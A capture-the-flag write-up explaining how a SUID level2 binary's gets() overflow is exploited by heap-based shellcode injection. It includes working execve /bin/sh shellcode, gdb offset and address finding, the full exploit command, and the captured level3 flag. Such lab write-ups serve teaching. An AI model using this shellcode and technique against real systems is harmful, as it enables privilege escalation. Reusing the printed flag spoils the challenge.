# Level 2

Same recon as level0: SUID **level3**.

## Analysis

```c
void p(void) {
    uint unaff_retaddr;
    char local_50[76];
    gets(local_50);                                  // no bounds check -> overflow
    if ((unaff_retaddr & 0xb0000000) == 0xb0000000)  // reject return addr in 0xb...
        _exit(1);
    puts(local_50);
    strdup(local_50);                                // copies our input to the heap
}
void main(void) { p(); }
```

`gets` has no size limit, so a long input writes past the buffer and overwrites the saved return address (the address the function jumps back to when it ends). But before returning, the code rejects any return address that starts with the hex digit `b`.

> **Why the `0xb` check matters.** ASLR is off, so addresses are fixed. The stack and libc both sit at addresses like `0xbxxxxxxx`. The heap and the program code sit at `0x0804xxxx`. So the check blocks the two usual tricks (running shellcode on the stack, or jumping into libc). An address on the heap still gets through.

`strdup(local_50)` makes a copy of our input on the heap. So the plan is [shellcode injection](../knowledge_base/shellcode_injection.md), but on the heap instead of the stack: put the shellcode at the start of the input, then set the return address to the heap copy.

## Exploit

### Offset to the return address

Buffer is at `ebp-0x4c` (76 bytes below `ebp`), then 4 bytes of saved EBP, so the return address is at offset `76 + 4 = 80`. Confirm with a crash:

```
(gdb) run < <(python -c "print('A' * 80 + 'BBBB')")
0x42424242 in ?? ()
```

EIP = `0x42424242`, so offset **80** is correct.

### Shellcode

45-byte execve(`/bin/sh`) shellcode ([source](https://fr.wikipedia.org/wiki/Shellcode)):

```
\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
```

This shellcode also clears the `edx` register (execve reads it as the environment pointer). If `edx` holds garbage, the `execve` system call fails and no shell starts.

### Layout

The input is `45 + 35 + 4 = 84` bytes:

```
[ shellcode 45 ][ padding 35 ][ heap address 4 ]
 0..44           45..79         80..83
```

Padding = `80 - 45 = 35` bytes (fills the gap up to the return address).

### Heap address

`strdup` uses `malloc`, which gives back an address based on the input **size**, not its content. So the heap address stays the same as long as the payload length is fixed. Build a dummy input of the exact final size (84 bytes), stop right after `call strdup` (its return value is in the `eax` register), and read that address:

```
(gdb) disas p
   0x08048538 <+...>:  call   <strdup@plt>
   0x0804853d <+...>:  ...                 <- break here
(gdb) b *0x0804853d
(gdb) r < <(python -c 'print "A"*84')
(gdb) info registers eax
eax            0x804a008
```

Heap copy is at `0x0804a008` → little-endian `\x08\xa0\x04\x08`.

### Run

```bash
$ (python -c 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "A"*35 + "\x08\xa0\x04\x08"'; cat) | ./level2
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

`print` adds a trailing newline so `gets` stops at exactly 84 bytes (otherwise the following `cat` keystrokes extend the buffer, the length changes, and the heap address shifts). `; cat` keeps stdin open for the spawned shell.

Flag: `492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02`
